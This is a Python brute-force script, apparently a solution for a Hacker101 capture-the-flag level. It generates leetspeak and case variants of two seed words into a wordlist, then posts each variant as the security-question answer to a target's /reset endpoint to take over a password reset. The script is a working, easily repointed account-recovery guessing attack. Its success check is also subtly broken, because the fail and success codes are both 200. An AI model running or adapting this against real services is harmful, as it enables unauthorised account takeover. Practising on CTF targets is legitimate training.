import requests
from tqdm import tqdm
import itertools as it
from itertools import product

URL = "https://69e6e85ca4011499ecdf4de20d041982.ctf.hacker101.com"
EXTENSION = "/reset"
FIELD_OF_INTEREST = "answer"
LOGIN = "hunter2"
FILE_NAME = LOGIN + ".txt"
LEET_DICT = {
    'a': '4', 
    'b': '8', 
    'e': '3', 
    'g': '9',
    # 'G': '6',
    'i': '1', 
    'l': '1',
    'o': '0', 
    's': '5', 
    't': '7', 
    'z': '2'
}
FAIL_CODE = 200
SUCCESS_CODE = 200
RESPONSE = "Invalid answer to security question"
CUSTOM_HEADER = None
CUSTOM_HEADER_CONTENT = None

json_data = {}
params = {}
data = {
    "account_hash": "cf505baebbaf25a0a4c63eb93331eb36",
    "answer": "",
}
words_for_gen = [
    "AzureDiamond",
    "Cthon98",
]

def leet_combs(word):
    possibles = []
    for l in word.lower():
        ll = LEET_DICT.get(l, l)
        possibles.append((l,) if ll == l else (l, ll))
    return [''.join(t) for t in product(*possibles)]

def big_letter_combs(word):
   return list(map(''.join, it.product(*(sorted(set((c.upper(), c.lower()))) for c in word))))

def create_pw_file():
    with open(FILE_NAME, "a") as file:
        obfuscated_words = []

        for word in words_for_gen:
            for leet in leet_combs(word):
                obfuscated_words += big_letter_combs(leet)
            for obfuscated_word in obfuscated_words:
                file.write(obfuscated_word + "\n")
        file.close()

# TODO: replace this with better code in create_pw_file
def delete_duplicates():
    with open(FILE_NAME, "r") as read_file:
        unique_lines = set(read_file.readlines())
        read_file.close()
    with open(FILE_NAME, "w") as write_file:
        write_file.writelines(unique_lines)
        write_file.close()


def brute_force_pw():
    with open(FILE_NAME, "r") as file:
        for index, pw_try in enumerate(tqdm(file.readlines())):
            _pw_try = pw_try.replace("\n", "")
            if FIELD_OF_INTEREST in json_data:
                json_data[FIELD_OF_INTEREST] = _pw_try
            if FIELD_OF_INTEREST in params:
                params[FIELD_OF_INTEREST] = _pw_try
            if FIELD_OF_INTEREST in data:
                data[FIELD_OF_INTEREST] = _pw_try
            if CUSTOM_HEADER:
                request = requests.post(URL + EXTENSION, headers={CUSTOM_HEADER: CUSTOM_HEADER_CONTENT}, json=json_data, params=params, data=data)
            else:
                request = requests.post(URL + EXTENSION, json=json_data, params=params, data=data)
            status_code = request.status_code
            response = request.content.decode("utf-8")
            if status_code != FAIL_CODE:
                if status_code == SUCCESS_CODE:
                    print("Successful resettet password for login: '" + LOGIN + "' | pet: '" + _pw_try + "' | status code: '" + str(status_code))
                else:
                    print("Got some status code not impl for pwtry: '" + _pw_try, "' | status code: '" + str(status_code) + "'")
                break
            else:
                if RESPONSE not in response:
                    print("Got response for email: '" + LOGIN + "' | pwtry: '" + _pw_try, "' | status code: '" + str(status_code) + "' | response: '" + response + "'")
                else:
                    pass

    file.close()

def main():
    create_pw_file()
    delete_duplicates()
    brute_force_pw()

if __name__ == "__main__":
    main()